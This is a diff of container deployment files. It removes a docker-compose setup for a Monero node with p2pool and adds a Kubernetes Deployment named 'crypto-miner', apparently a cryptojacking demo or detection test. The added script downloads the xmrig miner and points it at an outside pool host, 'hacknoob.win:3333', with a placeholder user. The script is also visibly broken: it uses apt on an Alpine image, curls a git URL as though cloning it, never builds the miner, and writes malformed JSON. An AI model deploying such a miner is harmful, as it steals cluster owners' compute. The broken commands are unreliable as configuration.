@@ -1,68 +1,44 @@
-version: "3.8"
-name: monero-suite
-services:
-  monerod:
-    image: sethsimmons/simple-monerod:latest
-    restart: unless-stopped
-    container_name: monerod
-    volumes:
-      - bitmonero:/home/monero/.bitmonero
-    ports:
-      - 18080:18080
-      - 18084:18084
-      - 18089:18089
-    command:
-      - --rpc-restricted-bind-ip=0.0.0.0
-      - --rpc-restricted-bind-port=18089
-      - --rpc-bind-ip=0.0.0.0
-      - --rpc-bind-port=18081
-      - --confirm-external-bind
-      - --enable-dns-blocklist
-      - --check-updates=disabled
-      - --max-log-files=3
-      - --max-log-file-size=1048576
-      - --no-igd
-      - --out-peers=64
-      - --limit-rate-down=1048576
-      - --prune-blockchain
-      - --public-node
-      - --zmq-pub=tcp://0.0.0.0:18084
-  p2pool:
-    image: sethsimmons/p2pool:latest
-    restart: unless-stopped
-    container_name: p2pool
-    tty: true
-    stdin_open: true
-    volumes:
-      - p2pool-data:/home/p2pool
-      - /dev/hugepages:/dev/hugepages:rw
-    ports:
-      - 3333:3333
-      - 37888:37888
-    command: --wallet
-      48oc8c65B9JPv6FBZBg7UN9xUYmxux6WfEh61WBoKca7Amh7r7bnCZ7JJicLw7UN3DEgEADwqrhwxGBJazPZ14PJGbmMyXX
-      --stratum 0.0.0.0:3333 --p2p 0.0.0.0:37888 --rpc-port 18089 --zmq-port
-      18084 --host monerod --addpeers node.portemonero.com:37888 --mini
-  watchtower:
-    image: containrrr/watchtower:latest
-    container_name: watchtower
-    restart: unless-stopped
-    environment:
-      WATCHTOWER_CLEANUP: true
-      WATCHTOWER_POLL_INTERVAL: 3600
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-  autoheal:
-    image: willfarrell/autoheal:latest
-    container_name: autoheal
-    restart: unless-stopped
-    environment:
-      AUTOHEAL_CONTAINER_LABEL: all
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-volumes:
-  bitmonero: {}
-  p2pool-data: {}
-
-
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: crypto-miner
+  name: crypto-miner
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: crypto-miner
+  template:
+    metadata:
+      labels:
+        app: crypto-miner
+    spec:
+      containers:
+      - image: arm64v8/alpine
+        name: crypto-miner
+        command:
+        - /bin/sh
+        - -c
+        - |
+          apt update
+          apt install -y curl
+          curl -L https://github.com/xmrig/xmrig.git
+          cd xmrig
+          config='{
+          "algo": "randomx",
+          "pools": [
+              {
+                  "url": "hacknoob.win:3333",
+                  "user": "NOTAREALUSER",
+                  "pass": "x",
+                  "enabled": true,
+              }
+          ],
+          "retries": 10,
+          "retry-pause": 3,
+          "watch": true
+          }'
+          echo $config > config.json
+          ./xmrig -c config.json
 
